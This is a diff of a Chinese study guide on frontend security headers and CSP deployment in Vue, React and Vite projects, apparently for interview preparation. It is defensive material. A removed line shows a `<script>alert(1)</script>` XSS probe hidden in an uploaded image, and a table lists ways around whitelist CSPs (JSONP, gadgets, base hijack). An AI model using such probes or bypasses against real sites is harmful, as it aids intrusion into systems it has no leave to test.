-**为什么需要 HSTS**：解决 **SSL 剥离攻击**——攻击者在用户第一次访问（还是 HTTP）时拦截并降级，让用户全程走 HTTP。HSTS 让浏览器"记住"必须 HTTPS，后续访问不会再发 HTTP 请求。
-
-**风险（必须说）：**
+HSTS 解决 **SSL 剥离**：攻击者在用户第一次访问（还是 HTTP）时拦截并降级，让用户全程走 HTTP；HSTS 让浏览器记住必须 HTTPS，后续访问不再发 HTTP 请求。
 
 | 风险 | 说明 |
 |---|---|
-| **不可逆** | 一旦 `max-age` 很长且 `includeSubDomains`，你的某个子域如果暂时没有 HTTPS，会**直接不可访问** |
-| **preload 更难撤** | 提交到 preload 列表后，要撤需要几个月（等浏览器发版） |
-| **只能在 HTTPS 响应里发** | HTTP 响应里的 HSTS 头会被浏览器忽略（否则可被伪造） |
+| **max-age 有效期内无法撤销** | 子域没有 HTTPS 时，无法从该子域下发清除头，到期前一直不可访问 |
+| **preload 撤出慢** | 提交到内置列表后，撤出要等浏览器发版 |
+| **只认 HTTPS 响应** | HTTP 响应里的 HSTS 头会被浏览器忽略 |
 
-> **实践建议**：先上 `max-age=300` 观察，再逐步加长；`preload` 最后做，且确认所有子域都有 HTTPS。
+实践：先 `max-age=300` 观察，确认所有子域都有 HTTPS 后再加长；`preload` 最后做。
 
 ### 9.3 `X-Content-Type-Options: nosniff`
 
-**防什么**：浏览器"猜"内容类型。
+`nosniff` 让浏览器严格按 `Content-Type` 处理响应：`text/plain` 的响应不会被当成脚本执行。
 
-```
-用户上传 1.jpg，实际内容是 <script>alert(1)</script>
-如果没有 nosniff，某些情况下浏览器会按 HTML/JS 解析执行
-加了 nosniff，浏览器严格按 Content-Type 处理 → 不会执行
-```
-
-**配套**：上传文件的响应还要加 `Content-Disposition: attachment`（强制下载）。
+上传文件的响应还应加 `Content-Disposition: attachment`，强制下载而不是内联渲染。
 
 ### 9.4 `Referrer-Policy`
 
@@ -611,7 +536,7 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 | `strict-origin-when-cross-origin`（现代默认） | 跨源只发**源**（`https://a.com/`），不发路径 |
 | `unsafe-url` | 发完整 URL（含参数，**危险**） |
 
-**为什么重要**：URL 里可能有 token、手机号、订单号。如果完整 Referer 发给了第三方（广告、CDN），就是泄露。
+URL 里可能有 token、手机号、订单号；完整 Referer 发给第三方就是泄露。
 
 ### 9.5 COOP / COEP / CORP（跨域隔离三件套）
 
@@ -619,25 +544,19 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 |---|---|
 | `Cross-Origin-Opener-Policy: same-origin` | 隔离 `window.opener` 引用，防标签页劫持 |
 | `Cross-Origin-Embedder-Policy: require-corp` | 要求所有跨域资源显式声明允许嵌入 |
-| `Cross-Origin-Resource-Policy: same-origin` | 我的资源只允许同源引用 |
+| `Cross-Origin-Resource-Policy: same-origin` | 资源只允许同源引用 |
 
-**用途**：开启 `crossOriginIsolated`，从而能用 `SharedArrayBuffer`、高精度计时器（`performance.now()` 精度提升）。
+用途：开启 `crossOriginIsolated`，从而能用 `SharedArrayBuffer`、高精度计时器。
 
-> **注意**：COEP `require-corp` 会导致**所有没声明 CORP/CORS 的第三方资源加载失败**，上线前必须逐个排查。
+COEP `require-corp` 会让所有没声明 CORP/CORS 的第三方资源加载失败，上线前要逐个排查。
 
 ### 9.6 `X-XSS-Protection: 0` 为什么
 
-老浏览器（IE/旧 Chrome）的 XSS 过滤器有**自身漏洞**：
-- 它基于"反射检测"，可以被绕过
-- 某些情况下它会把页面上合法的内容误删，甚至**制造新的 XSS**
-
-所以现代建议是**显式关掉**：`X-XSS-Protection: 0`。Chrome 已移除 XSS Auditor。
+老浏览器（IE / 旧 Chrome）的 XSS 过滤器基于反射检测，可以被绕过，也会误删合法内容。现代做法是显式关掉：`X-XSS-Protection: 0`。Chrome 已移除 XSS Auditor。
 
 ---
 
 ## 10. Vue / React / Vite 项目落地 CSP 的坑
-
-> 这一节是最"实战"的部分。面试时能说出这些，说明你真的配过 CSP。
 
 ### 10.1 坑一：框架的内联样式被 `style-src` 拦
 
@@ -646,63 +565,55 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 <div :style="{ color: activeColor }">文本</div>
 ```
 
-**渲染结果**：
-
 ```html
-<div style="color: red">文本</div>   <!-- 这是内联样式，受 style-src 约束 -->
+<div style="color: red">文本</div>
+<!-- 这是 style 属性，由 style-src-attr 控制，未设置时回落到 style-src -->
 ```
-
-**如果 `style-src` 没有 `'unsafe-inline'`，这个样式会被拒绝**，页面样式全乱。
 
 | 方案 | 说明 |
 |---|---|
-| `style-src 'self' 'unsafe-inline'` | 最简单，最常见（**样式内联的 XSS 风险远低于脚本**） |
-| `style-src 'self' 'nonce-xxx'` | 严格，但需要给所有动态 style 加 nonce（框架不支持，很难） |
-| 用 CSS 变量 + class 代替 `:style` | 最干净但改造量大 |
+| `style-src 'self' 'unsafe-inline'` | 最常见；样式内联的攻击面远小于脚本 |
+| `style-src-attr 'unsafe-hashes' 'sha256-...'` | 只能放行内容固定的属性值，动态值无法预先算 hash |
+| 用 class + CSS 变量代替 `:style` | 不用放宽策略，改造量大 |
 
-**行业现状**：绝大多数生产站点都用了 `style-src 'unsafe-inline'`，因为**内联样式造成的 XSS 面很小**（`expression()` 只在老 IE 有）。**这就是一个"安全 vs 可用"的现实权衡，面试时说出来很加分。**
+nonce 只作用于 `<style>` 元素，对 `style` 属性无效。
 
 ### 10.2 坑二：Vue 的运行时编译器需要 `unsafe-eval`
 
 ```js
-// ❌ 用完整版 Vue（含编译器）：会用 new Function 编译模板
+// ❌ 完整版 Vue（含编译器）：用 new Function 编译模板
 import { createApp } from 'vue/dist/vue.esm-bundler.js'
 createApp({ template: '<div>{{ msg }}</div>' })
-// → CSP 需要 'unsafe-eval'
+// → 需要 'unsafe-eval'
 ```
 
 ```js
-// ✅ 用 SFC（.vue 文件）+ 构建时预编译：不需要 eval
+// ✅ SFC（.vue 文件）+ 构建时预编译：不需要 eval
 import { createApp } from 'vue'
 import App from './App.vue'
 createApp(App).mount('#app')
 ```
 
-> **结论**：**用 SFC + 构建时编译，就不会有 `unsafe-eval` 需求**。这是一个很多人不知道的细节。
-
 ### 10.3 坑三：webpack / Vite 的运行时注入
 
 | 注入内容 | 受哪条指令约束 | 解决 |
 |---|---|---|
-| webpack 的 `runtimeChunk`（模块加载逻辑） | `script-src`（外部文件，`'self'` 即可） | 无需处理 |
-| webpack 的 HMR 客户端（仅开发环境） | 内联脚本 + `eval` | 开发环境可放宽，生产不启用 |
+| webpack 的 `runtimeChunk` | `script-src`（外部文件，`'self'` 即可） | 无需处理 |
+| webpack 的 HMR 客户端（仅开发环境） | 内联脚本 + `eval` | 开发环境放宽，生产不启用 |
 | Vite 的 `modulepreload` polyfill（内联） | `script-src` | 用 hash 或 nonce |
 | Vite 的 dev server 注入 | 内联脚本 + WS 连接 | 开发环境放宽 |
 | `__INITIAL_STATE__` 内联数据 | `script-src`（如果是 `<script>window.x=...</script>`） | 改用 `type="application/json"` + `JSON.parse` |
 
-**最后一条是个好技巧**：
-
 ```html
-<!-- ❌ 会被 CSP 拦（内联脚本） -->
+<!-- ❌ 会被 CSP 拦（可执行内联脚本） -->
 <script>window.__STATE__ = {"user":"张三"}</script>
 
-<!-- ✅ 不会被拦（不是可执行脚本） -->
+<!-- ✅ 不是可执行脚本，不会被拦 -->
 <script type="application/json" id="__STATE__">{"user":"张三"}</script>
 <script src="/app.js" nonce="xxx"></script>
 ```
 
 ```js
-// app.js 里读
 const state = JSON.parse(document.getElementById('__STATE__').textContent)
 ```
 
@@ -712,9 +623,9 @@ const state = JSON.parse(document.getElementById('__STATE__').textContent)
 Content-Security-Policy: default-src 'self'
 ```
 
-这行配置会让**所有跨域接口请求、所有 WebSocket 连接全部失败**（因为 `connect-src` 回落到 `default-src 'self'`）。
+`connect-src` 未声明时回落到 `default-src 'self'`，所有跨域接口请求和跨域 WebSocket 连接都会失败。
 
-**上线前必查清单：**
+上线前检查：
 
 ```
 □ 所有 API 域名在 connect-src
@@ -727,7 +638,7 @@ Content-Security-Policy: default-src 'self'
 
 ### 10.5 坑五：`frame-ancestors` 和微前端
 
-如果你们有微前端 / 被其他系统 iframe 嵌入的场景，`frame-ancestors 'none'` 会**直接让页面无法被嵌入**。
+被其他系统 iframe 嵌入时，`frame-ancestors 'none'` 会让页面无法被嵌套。
 
 ```http
 Content-Security-Policy: frame-ancestors 'self' https://portal.example.com
@@ -737,7 +648,7 @@ Content-Security-Policy: frame-ancestors 'self' https://portal.example.com
 
 ## 11. 题 13：前端常规安全策略总清单
 
-> 原答案 6 条太粗。这里给一份可以直接贴到项目 README 的清单，按"必须做 / 应该做 / 视情况"三档。
+按"必须做 / 应该做 / 视情况"三档。
 
 ### 11.1 必须做（P0）
 
@@ -748,7 +659,7 @@ Content-Security-Policy: frame-ancestors 'self' https://portal.example.com
 | 3 | **输出编码** | 禁止 `innerHTML` 直接用用户输入；框架用 `{{ }}` |
 | 4 | **危险 API 禁用** | ESLint `no-unsanitized`；`v-html`/`dangerouslySetInnerHTML` 需 review |
 | 5 | **CSP** | 至少 `default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` |
-| 6 | **`X-Content-Type-Options: nosniff`** | 一行配置 |
+| 6 | **`X-Content-Type-Options`** | 见 9.3 |
 | 7 | **上传文件独立域 + `Content-Disposition`** | 防 SVG/HTML 上传 XSS |
 | 8 | **密钥不进前端** | 检查 bundle 里有没有 API key / secret |
 
@@ -757,46 +668,40 @@ Content-Security-Policy: frame-ancestors 'self' https://portal.example.com
 | # | 项 | 落地方式 |
 |---|---|---|
 | 9 | **CSRF Token / SameSite** | 见 02 册 |
-| 10 | **`Referrer-Policy`** | `strict-origin-when-cross-origin` |
-| 11 | **`Permissions-Policy`** | 关闭不需要的能力 |
-| 12 | **SRI（第三方脚本）** | `integrity` + `crossorigin` |
-| 13 | **依赖审计** | `npm audit` / Snyk 进 CI |
-| 14 | **锁文件 + `npm ci`** | 防依赖漂移 |
-| 15 | **sourcemap 不公开** | 上传到监控平台后删除 |
-| 16 | **日志脱敏** | 不打印手机号/密码/token |
-| 17 | **`target="_blank"` 加 `rel="noopener noreferrer"`** | 防标签页劫持 |
+| 10 | **安全响应头补齐** | `Referrer-Policy`、`Permissions-Policy` 取值见 9.1 |
+| 11 | **SRI（第三方脚本）** | `integrity` + `crossorigin` |
+| 12 | **依赖审计** | `npm audit` / Snyk 进 CI |
+| 13 | **锁文件 + `npm ci`** | 防依赖漂移 |
+| 14 | **sourcemap 不公开** | 上传到监控平台后删除 |
+| 15 | **日志脱敏** | 不打印手机号/密码/token |
+| 16 | **`target="_blank"` 加 `rel="noopener noreferrer"`** | 防标签页劫持 |
 
 ### 11.3 视情况（P2）
 
 | # | 项 | 说明 |
 |---|---|---|
-| 18 | **Trusted Types** | 改造量大，但效果最好 |
-| 19 | **COOP/COEP/CORP** | 需要跨域隔离（`SharedArrayBuffer`）时才上 |
-| 20 | **CSP `report-to` + 告警** | 有安全运营能力时 |
-| 21 | **前端混淆 / 防调试** | 只提高成本，见 06 册 |
+| 17 | **Trusted Types** | 改造量大，效果最好 |
+| 18 | **COOP/COEP/CORP** | 需要跨域隔离（`SharedArrayBuffer`）时才上，见 9.5 |
+| 19 | **CSP `report-to` + 告警** | 有安全运营能力时 |
+| 20 | **前端混淆 / 防调试** | 只提高成本，见 06 册 |
 
 ---
 
 ## 12. 常见坑
 
-| # | 坑 | 纠正 |
-|---|---|---|
-| 1 | CSP 只写在 meta 里 | `frame-ancestors`、`sandbox`、`report-uri` 在 meta 里无效 |
-| 2 | 同时写 `'unsafe-inline'` 和 nonce | CSP2+ 浏览器忽略 `'unsafe-inline'`，但老浏览器会生效 → 只留 nonce |
-| 3 | nonce 固定不变 | 必须每请求随机；带 nonce 的 HTML 不能缓存 |
-| 4 | 忘配 `base-uri` | `<base>` 劫持可绕过 `script-src 'self'` |
-| 5 | 忘配 `object-src 'none'` | `<object>`/`<embed>` 是绕过入口 |
-| 6 | 忘配 `connect-src` | 所有接口/WebSocket 请求被拦，站点全挂 |
-| 7 | `script-src https:` | 等于允许任何 HTTPS 域，基本没防住 |
-| 8 | 直接上强制 CSP | 必然搞挂站点；先 `Report-Only` 跑一周 |
-| 9 | `style-src` 卡死 `:style` | 现实做法是 `'unsafe-inline'`（风险较低），或改 CSS 变量 |
-| 10 | 把 CSP 当"根治" | 它是缓解，不能防数据外带，不能替代输出编码 |
-| 11 | `frame-src` 和 `frame-ancestors` 搞混 | 前者"我能嵌谁"，后者"谁能嵌我" |
-| 12 | HSTS 一上来就 `preload` | 不可逆，先用短 `max-age` 观察 |
-| 13 | `includeSubDomains` 但某子域没 HTTPS | 那个子域会直接不可访问 |
-| 14 | 开了 COEP `require-corp` | 所有没声明 CORP 的第三方资源全部加载失败 |
-| 15 | 还留着 `X-XSS-Protection: 1; mode=block` | 已废弃且有漏洞，应设 `0` |
-| 16 | 4xx/5xx 响应没带安全头 | nginx 的 `add_header` 要加 `always` |
+下面的报错文案是本机 Chrome 对 `script-src`、`nonce`、`Report-Only`、`frame-ancestors` 的实测输出（摘要）。
+
+| # | 现象 / 典型报错 | 原因 | 处理 |
+|---|---|---|---|
+| 1 | `Executing inline script violates ... 'script-src 'self''. ... a nonce ('nonce-...') is required ... The action has been blocked.` | 内联脚本没有授权 | 加 nonce/hash，或抽成外部文件 |
+| 2 | `Loading the script 'http://localhost:PORT/app.js' violates ... "script-src 'self'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.` | 跨源脚本不在白名单 | 加源，或改用 nonce + `strict-dynamic` |
+| 3 | 同一句违规文案，但级别是 info，结尾是 `The policy is report-only, so the violation has been logged but no further action has been taken.` | 用了 `Content-Security-Policy-Report-Only` | 页面没有被拦截，按报告补齐后再切强制 |
+| 4 | `Framing 'http://127.0.0.1:PORT/' violates ... "frame-ancestors 'none'". The request has been blocked.` | 被嵌页面禁止任何祖先 | 调整 `frame-ancestors` |
+| 5 | `Refused to display '...' in a frame because it set 'X-Frame-Options' to 'deny'.` | 只配了 `X-Frame-Options` | 迁到 `frame-ancestors`；两者同时存在时以后者为准 |
+| 6 | 页面样式被拒，`style-src` 相关报错 | `:style` / `style` 属性没有 `'unsafe-inline'` | 见 10.1 |
+| 7 | 接口、WebSocket 全部失败 | `connect-src` 漏配，回落到 `default-src` | 补齐接口域名 |
+| 8 | nonce 固定不变或整页被缓存 | HTML 被共享缓存，同一个 nonce 复用 | 每请求随机 + `Cache-Control: private, no-cache` |
+| 9 | 4xx/5xx 页面没有安全头 | nginx 的 `add_header` 默认只对部分 2xx/3xx 生效 | 加 `always` |
 
 ---
 
@@ -804,54 +709,50 @@ Content-Security-Policy: frame-ancestors 'self' https://portal.example.com
 
 ### 13.1 「CSP 可以解决什么问题」——30 秒
 
-> "CSP 是一份白名单，通过响应头告诉浏览器只允许从哪些源加载资源、执行哪些脚本，不在白名单的一律拒绝。它主要防 XSS——即使注入了 `<script>`，没有 nonce、不在白名单就不执行；同时还能用 `frame-ancestors` 防点击劫持、`base-uri 'none'` 防相对路径劫持。它是缓解手段不是根治手段。"
+- **定义**：响应头下发的白名单，声明页面只能从哪些源加载资源、执行哪些脚本，不在名单内的一律拒绝。
+- **能防**：XSS 脚本执行（无 nonce / 不在白名单不执行）、点击劫持（`frame-ancestors`）、相对路径劫持（`base-uri 'none'`）。
+- **定位**：缓解手段，不是根治手段。
 
 ### 13.2 「CSP 可以解决什么问题」——2 分钟
 
-> "CSP 本质是**给浏览器立规矩**：一份由服务端下发的策略，声明这个页面只允许加载哪些资源、只允许执行哪些脚本。不在名单里的一律拒绝，并且可以上报违规。
->
-> **它能解决的问题**主要是三类：一是 XSS，注入的脚本没有 nonce 就不执行，把'XSS 必然导致代码执行'降级成'XSS 可能只是一个坏标签'；二是点击劫持，用 `frame-ancestors` 控制谁能嵌我；三是混合内容和相对路径劫持，用 `upgrade-insecure-requests` 和 `base-uri 'none'`。
->
-> **配置演进上有四代**。第一代是域名白名单，`script-src 'self' cdn.example.com`，问题是挡不住内联脚本，而且白名单域名上如果有 JSONP 接口就能被绕过。第二代是 **nonce**，每次请求生成随机值，只有带这个 nonce 的脚本才执行，关键要求是必须每请求随机、不能复用、带 nonce 的 HTML 不能缓存。第三代是 **hash**，适合内容固定的内联脚本。第四代是 **nonce 加 `strict-dynamic`**，这也是现在的推荐做法——它会忽略域名白名单，并让信任从入口脚本传染给动态创建的脚本，所以 webpack/Vite 的 chunk 加载不会被拦。
->
-> 还有一个兼容写法值得记：`script-src 'nonce-xxx' 'strict-dynamic' https: 'unsafe-inline'`。支持 CSP3 的浏览用 nonce 和 strict-dynamic，忽略后面两个；支持 CSP2 的用 nonce 忽略 unsafe-inline；老浏览器降级用 https。这是渐进增强。
->
-> **上线必须灰度**：先用 `Content-Security-Policy-Report-Only` 头跑一两周，它只上报不拦截；收集报告看 `violated-directive` 和 `blocked-uri`，补齐白名单；再切成强制模式，并保留上报作为长期回归检测。
->
-> **最后要说清它的边界**：CSP 是缓解不是修复，它挡不住数据外带（`img-src` 允许 https 的话，XSS 仍可以用 img 把数据带出去），也防不了服务端漏洞。所以定位是：输出编码第一道，CSP 第二道，Trusted Types 第三道。"
+- **机制**：服务端下发策略；未声明的指令回落到 `default-src`，多个策略取交集；违规可上报。
+- **能防三类**：XSS 脚本执行、点击劫持（`frame-ancestors`）、混合内容与相对路径劫持。
+- **策略演进**：域名白名单 → nonce → hash → nonce + `strict-dynamic`。白名单要么拦掉所有内联脚本，要么开 `'unsafe-inline'` 后失去防护，且挡不住 JSONP；`strict-dynamic` 让信任沿 DOM 创建链传播，动态 chunk 不需要逐个加 nonce。
+- **上线**：`Report-Only` 收集违规 → 补白名单 / 加 nonce → 强制并保留上报。
+- **边界**：缓解不是修复，不防数据外带和服务端漏洞；定位是输出编码 → CSP → Trusted Types。
 
 ### 13.3 「前端的常规安全策略」——30 秒
 
-> "我按四层讲：**传输层**全站 HTTPS 加 HSTS；**响应头层**CSP、`X-Content-Type-Options: nosniff`、`Referrer-Policy`、`X-Frame-Options`；**代码层**输出编码、禁用 `innerHTML` 和 `v-html`、Cookie 加 `HttpOnly+Secure+SameSite`、外链加 `rel="noopener"`；**工程层**依赖审计、SRI、密钥不进 bundle、sourcemap 不公开、日志脱敏。"
+- **传输层**：全站 HTTPS + HSTS。
+- **响应头层**：CSP、`X-Content-Type-Options`、`Referrer-Policy`、`X-Frame-Options`（或 `frame-ancestors`）、`Permissions-Policy`。
+- **代码层**：输出编码，禁用 `innerHTML` / `v-html`，Cookie 加 `HttpOnly + Secure + SameSite`，外链加 `rel="noopener"`。
+- **工程层**：依赖审计、SRI、密钥不进 bundle、sourcemap 不公开、日志脱敏。
 
 ---
 
 ## 14. 追问表
 
-| # | 追问 | 要点 |
-|---|---|---|
-| 1 | CSP 通过什么下发？ | 响应头（推荐）或 meta；meta 不支持 `frame-ancestors` |
-| 2 | `default-src` 和其他指令关系？ | 其他指令没写时回落到 `default-src` |
-| 3 | nonce 和 hash 区别？ | nonce 每请求随机、适合动态；hash 按内容、适合固定 |
-| 4 | `'unsafe-inline'` 和 nonce 同时存在？ | CSP2+ 忽略 `'unsafe-inline'`；老浏览器会生效 → 别写 |
-| 5 | `strict-dynamic` 解决什么？ | 让信任传染给动态创建的脚本；同时忽略域名白名单 |
-| 6 | 为什么 `base-uri 'none'` 重要？ | 防 `<base>` 劫持相对路径脚本 |
-| 7 | `frame-src` 和 `frame-ancestors` 区别？ | 前者我能嵌谁，后者谁能嵌我 |
-| 8 | CSP 能防 DOM 型 XSS 吗？ | 能拦内联事件和未授权脚本；但挡不住数据外带和非脚本型问题 |
-| 9 | CSP 能防 CSRF 吗？ | 不能（`form-action` 只限制表单目标） |
-| 10 | 白名单 CSP 怎么被绕过？ | JSONP 端点、库 gadget、`<base>` 劫持、开放重定向 |
-| 11 | 怎么上线 CSP 不影响业务？ | `Report-Only` 先跑，收集报告，补白名单，再强制 |
-| 12 | Vue 项目 CSP 有什么坑？ | `:style` 需 `style-src 'unsafe-inline'`；完整版 Vue 需 `unsafe-eval` |
-| 13 | 初始数据怎么内联才不被拦？ | 用 `<script type="application/json">` + `JSON.parse` |
-| 14 | HSTS 三个参数？ | `max-age` / `includeSubDomains` / `preload` |
-| 15 | HSTS preload 有什么风险？ | 不可逆，撤出要等浏览器发版 |
-| 16 | `X-XSS-Protection` 该设什么？ | `0`（关掉），已废弃且有漏洞 |
-| 17 | `nosniff` 防什么？ | 防浏览器 MIME 嗅探，避免上传文件被当脚本执行 |
-| 18 | `Referrer-Policy` 默认值？ | 现代浏览器默认 `strict-origin-when-cross-origin` |
-| 19 | COOP/COEP 有什么用？ | 跨域隔离，开启 `crossOriginIsolated`（`SharedArrayBuffer`） |
-| 20 | 纯静态站点怎么做 nonce？ | 做不到每请求随机；用 hash，或边缘函数注入 |
-| 21 | CSP 和 Trusted Types 关系？ | CSP 管"能执行什么"，Trusted Types 管"能不能把字符串变成 HTML" |
-| 22 | 为什么 4xx 页面也要带安全头？ | nginx `add_header` 要加 `always`，否则错误页无保护 |
+| # | 追问 | 要点 | 见 |
+|---|---|---|---|
+| 1 | CSP 通过什么下发？ | 响应头（推荐）或 meta；meta 不支持 `frame-ancestors` | 1.2 |
+| 2 | `default-src` 和其他指令的关系？ | 其他指令没写时回落到 `default-src` | 1.3 |
+| 3 | nonce 和 hash 的区别？ | nonce 每请求随机、适合动态；hash 按内容、适合固定 | 3.2 / 3.3 |
+| 4 | `'unsafe-inline'` 和 nonce 同时存在？ | CSP2+ 忽略 `'unsafe-inline'`，CSP1 仍生效 | 3.2 |
+| 5 | `strict-dynamic` 解决什么？ | 信任传染给动态创建的脚本，同时忽略域名白名单 | 3.4 |
+| 6 | 为什么 `base-uri 'none'` 重要？ | 防 `<base>` 劫持相对路径脚本 | 1.4 |
+| 7 | `frame-src` 和 `frame-ancestors` 的区别？ | 前者父页面能嵌谁，后者子页面能被谁嵌 | 2.2 |
+| 8 | CSP 能防 DOM 型 XSS 吗？ | 能拦内联事件和未授权脚本；挡不住数据外带和非脚本型问题 | 7.2 |
+| 9 | CSP 能防 CSRF 吗？ | 不能；`form-action` 只限制表单提交目标 | 7.2 |
+| 10 | 白名单 CSP 怎么被绕过？ | JSONP 端点、库 gadget、`<base>` 劫持、开放重定向 | 8 |
+| 11 | 怎么上线 CSP 不影响业务？ | `Report-Only` 先跑，收集报告，补白名单，再强制 | 6 |
+| 12 | Vue 项目有什么坑？ | `:style` 需 `style-src` 放行内联样式；运行时编译需 `unsafe-eval` | 10 |
+| 13 | 初始数据怎么内联才不被拦？ | `<script type="application/json">` + `JSON.parse` | 10.3 |
+| 14 | 纯静态站点怎么做 nonce？ | 做不到每请求随机；用 hash 或边缘函数注入 | 4.3 |
+| 15 | HSTS 的三个参数？ | `max-age` / `includeSubDomains` / `preload` | 9.2 |
+| 16 | `X-XSS-Protection` 该设什么？ | `0`，已废弃且有漏洞 | 9.6 |
+| 17 | COOP/COEP 有什么用？ | 跨域隔离，开启 `crossOriginIsolated` | 9.5 |
+| 18 | CSP 和 Trusted Types 的关系？ | CSP 管"能执行什么"，Trusted Types 管"字符串能不能变成 HTML" | 7.3 |
+| 19 | 为什么 4xx 页面也要带安全头？ | nginx `add_header` 要加 `always` | 12 |
 
 ---
 
@@ -867,22 +768,24 @@ default-src 'self'; script-src 'nonce-xxx';
 object-src 'none'; base-uri 'none'; frame-ancestors 'none'
 
 【四代策略】
-① 域名白名单    挡不住内联，可被 JSONP 绕过
+① 域名白名单    内联要 unsafe-inline，可被 JSONP / gadget 绕过
 ② nonce         每请求随机、不能复用、HTML 不能缓存
 ③ hash          内容固定，可缓存
 ④ nonce + strict-dynamic   忽略白名单 + 信任传染 ← 推荐
 
 【兼容三件套】
 script-src 'nonce-xxx' 'strict-dynamic' https: 'unsafe-inline'
-CSP3 用 nonce+strict-dynamic / CSP2 用 nonce / CSP1 降级用 https
+CSP3 忽略 https: 与 unsafe-inline；CSP2 用 nonce 但 https: 仍生效；
+CSP1 不识别 nonce，退化为 https: + 内联放行
 
 【关键规则】
 'unsafe-inline' 遇 nonce/hash 被忽略（CSP2+）→ 只留 nonce
-frame-src 我能嵌谁 ｜ frame-ancestors 谁能嵌我（防点击劫持用后者）
-default-src 是兜底
+frame-src 父页面能嵌谁 ｜ frame-ancestors 子页面能被谁嵌（防点击劫持用后者）
+frame-ancestors 与 X-Frame-Options 同时存在 → 前者优先
+default-src 是兜底，未声明指令回落
 
 【上线四步】
-Report-Only 跑一周 → 收报告看 violated-directive/blocked-uri
+Report-Only 跑一段时间 → 收报告看 violated-directive/blocked-uri
 → 补白名单/加 nonce → 强制 + 保留上报
 
 【边界】
